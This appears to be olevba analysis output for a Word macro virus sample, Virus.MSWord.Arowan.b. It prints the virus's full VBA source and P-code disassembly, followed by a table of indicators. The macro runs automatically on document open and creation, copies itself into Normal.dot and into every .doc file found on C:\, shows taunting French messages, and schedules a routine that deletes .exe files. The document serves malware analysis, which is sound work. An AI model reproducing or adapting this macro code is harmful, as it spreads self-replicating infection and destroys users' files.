olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Arowan.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Arowan.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module3.bas 
in file: ./Virus.MSWord.Arowan.b - OLE stream: 'Macros/VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro suriv "EXE Cuttor"

Sub autoopen()

Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("C:\windows\system\SARC.dll") = False Then

On Error Resume Next

With ActiveDocument.AttachedTemplate
            Application.OrganizerDelete _
                Source:="C:\Windows\Application Data\Microsoft\Modèles\Normal.dot", _
                Name:="Module3", _
                Object:=wdOrganizerObjectProjectItems
End With

On Error Resume Next

ActiveDocument.SaveAs ("c:\windows\system\EXE Cuttor.Doc")

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:="c:\windows\Application data\microsoft\modèles\normal.dot", _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems

Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("c:\Windows\System\SARC.dll", True)
a.Close

On Error Resume Next

Else

On Error Resume Next

Set fsb = CreateObject("Scripting.FileSystemObject")
If fsb.FileExists("C:\Windows\system\EXE Cuttor.doc") = False Then
MsgBox "Vous avez essaiez de schque ?!?!", vbExclamation + vbOKOnly, "Ou est passé EXE Cuttor.doc ???"
MsgBox " >:-> ", vbExclamation + vbOKOnly, " :o) "
Application.OnTime When:=Now + TimeValue("00:00:15"), _
Name:="Project.Module3.kill"
End If

Application.OrganizerCopy Source:="C:\Windows\system\EXE Cuttor.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems
End If

End Sub
Sub search()
Dim fs As String
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.doc"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
End With

On Error Resume Next

With Application.FileSearch
    If .Execute() > 0 Then
        For I = 1 To .FoundFiles.Count
            I.Attributes = I.Attributes - 1
            Application.OrganizerCopy Source:="c:\windows\system\EXE Cuttor.doc", _
            Destination:=.FoundFiles(I), _
            Name:="Module3", _
            Object:=wdOrganizerObjectProjectItems
            I.Attributes = I.Attributes + 0
            I.Attributes = I.Attributes + 1
           Next I
    Else
         End If
End With
Application.OnTime When:=Now + TimeValue("01:01:01"), _
Name:="Project.Module3.Destroye"
End Sub
Sub AutoNew()

On Error Resume Next

Application.OrganizerCopy Source:="C:\Windows\system\EXE Cuttor.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems

On Error Resume Next

ActiveDocument.Save

End Sub
Sub Destroye()
Dim po
    Set po = CreateObject("Scripting.FileSystemObject")
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.exe"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
End With

On Error Resume Next

With Application.FileSearch
    If .Execute() > 0 Then
        For e = 0 To 2
        po.deletefile .FoundFiles(e), True
         Next e
    Else
         End If
End With
End Sub
Sub kill()
MsgBox "Ma vengence va étre terrible !!!", vbCritical + vbOKOnly

ActiveDocument.SaveAs ("c:\windows\system\EXE Cuttor.Doc")

Call search
End Sub

'Macro suriv "EXE Cuttor"

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Arowan.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1164 bytes
' Macros/VBA/Module3 - 8432 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 "Macro suriv "EXE Cuttor""
' Line #1:
' Line #2:
' 	FuncDefn (Sub autoopen())
' Line #3:
' Line #4:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #5:
' 	LitStr 0x001A "C:\windows\system\SARC.dll"
' 	Ld fs 
' 	ArgsMemLd FileExists 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #6:
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' Line #9:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	With 
' Line #10:
' 	LineCont 0x000C 03 00 10 00 07 00 10 00 0B 00 10 00
' 	LitStr 0x0038 "C:\Windows\Application Data\Microsoft\Modèles\Normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0007 "Module3"
' 	ParamNamed Name 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed Object 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #11:
' 	EndWith 
' Line #12:
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' Line #15:
' 	LitStr 0x0020 "c:\windows\system\EXE Cuttor.Doc"
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #16:
' Line #17:
' 	LineCont 0x000C 09 00 00 00 0D 00 00 00 11 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0038 "c:\windows\Application data\microsoft\modèles\normal.dot"
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module3"
' 	ParamNamed Name 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed Object 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #18:
' Line #19:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #20:
' 	SetStmt 
' 	LitStr 0x001A "c:\Windows\System\SARC.dll"
' 	LitVarSpecial (True)
' 	Ld fs 
' 	ArgsMemLd CreateTextFile 0x0002 
' 	Set a 
' Line #21:
' 	Ld a 
' 	ArgsMemCall Close 0x0000 
' Line #22:
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' Line #25:
' 	ElseBlock 
' Line #26:
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' Line #29:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set msbox 
' Line #30:
' 	LitStr 0x0020 "C:\Windows\system\EXE Cuttor.doc"
' 	Ld msbox 
' 	ArgsMemLd FileExists 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x0020 "Vous avez essaiez de schque ?!?!"
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x001F "Ou est passé EXE Cuttor.doc ???"
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	LitStr 0x0006 " >:-> "
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0005 " :o) "
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld TimeValue 
' 	LitStr 0x0008 "00:00:15"
' 	ArgsLd kill 0x0001 
' 	Add 
' 	ParamNamed Now 
' 	LitStr 0x0014 "Project.Module3.kill"
' 	ParamNamed Name 
' 	Ld Application 
' 	ArgsMemCall When 0x0002 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	LineCont 0x000C 07 00 00 00 0D 00 00 00 11 00 00 00
' 	LitStr 0x0020 "C:\Windows\system\EXE Cuttor.doc"
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module3"
' 	ParamNamed Name 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed Object 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub fsb())
' Line #41:
' 	Dim 
' 	VarDefn fs (As String)
' Line #42:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #43:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #44:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #45:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #46:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #47:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #48:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #49:
' 	EndWith 
' Line #50:
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' Line #53:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #54:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #56:
' 	Ld I 
' 	MemLd id_036A 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld I 
' 	MemSt id_036A 
' Line #57:
' 	LineCont 0x000C 07 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	LitStr 0x0020 "c:\windows\system\EXE Cuttor.doc"
' 	ParamNamed Source 
' 	Ld I 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module3"
' 	ParamNamed Name 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed Object 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #58:
' 	Ld I 
' 	MemLd id_036A 
' 	LitDI2 0x0000 
' 	Add 
' 	Ld I 
' 	MemSt id_036A 
' Line #59:
' 	Ld I 
' 	MemLd id_036A 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld I 
' 	MemSt id_036A 
' Line #60:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndWith 
' Line #64:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld TimeValue 
' 	LitStr 0x0008 "01:01:01"
' 	ArgsLd kill 0x0001 
' 	Add 
' 	ParamNamed Now 
' 	LitStr 0x0018 "Project.Module3.Destroye"
' 	ParamNamed Name 
' 	Ld Application 
' 	ArgsMemCall When 0x0002 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub AutoNew())
' Line #67:
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' Line #70:
' 	LineCont 0x000C 07 00 00 00 0D 00 00 00 11 00 00 00
' 	LitStr 0x0020 "C:\Windows\system\EXE Cuttor.doc"
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module3"
' 	ParamNamed Name 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed Object 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #71:
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub Destroye())
' Line #78:
' 	Dim 
' 	VarDefn deletefilke
' Line #79:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set deletefilke 
' Line #80:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #81:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #82:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #83:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #84:
' 	LitStr 0x0005 "*.exe"
' 	MemStWith FileName 
' Line #85:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #86:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #87:
' 	EndWith 
' Line #88:
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' Line #91:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #92:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #93:
' 	StartForVariable 
' 	Ld _B_var_e 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	For 
' Line #94:
' 	Ld _B_var_e 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitVarSpecial (True)
' 	Ld deletefilke 
' 	ArgsMemCall e 0x0002 
' Line #95:
' 	StartForVariable 
' 	Ld _B_var_e 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndWith 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub Attributes())
' Line #101:
' 	LitStr 0x0020 "Ma vengence va étre terrible !!!"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #102:
' Line #103:
' 	LitStr 0x0020 "c:\windows\system\EXE Cuttor.Doc"
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #104:
' Line #105:
' 	ArgsCall (Call) fsb 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	QuoteRem 0x0000 0x0018 "Macro suriv "EXE Cuttor""
' Line #109:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |SARC.dll            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

